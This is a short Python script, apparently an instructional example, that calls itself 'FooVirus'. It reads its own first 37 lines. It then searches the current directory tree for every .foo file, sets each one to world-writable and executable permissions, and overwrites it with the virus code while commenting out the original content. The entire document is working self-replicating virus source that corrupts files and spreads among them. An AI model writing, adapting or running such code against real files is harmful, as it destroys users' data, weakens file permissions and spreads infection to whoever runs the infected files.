import sys
import os
import glob

print("Hello from FooVirus")

IN = open(sys.argv[0], "r") 
virus = [line for (i, line) in enumerate(IN) if i < 37]
virus.append("\n")
IN.close()

for item in glob.glob("./**/*.foo", recursive=True):
    IN = open(item, "r")
    print("Opened", item)
    all_of_it = IN.readlines()
    IN.close() 

    if any("foovirus" in line for line in all_of_it):
        continue

    os.chmod(item, 0o777)  # Read, Write, and Execute access to owner, group, and others

    OUT = open(item, "w")
    OUT.writelines(virus)
    all_of_it = ["#" + line for line in all_of_it]
    OUT.writelines(all_of_it)
    OUT.close()
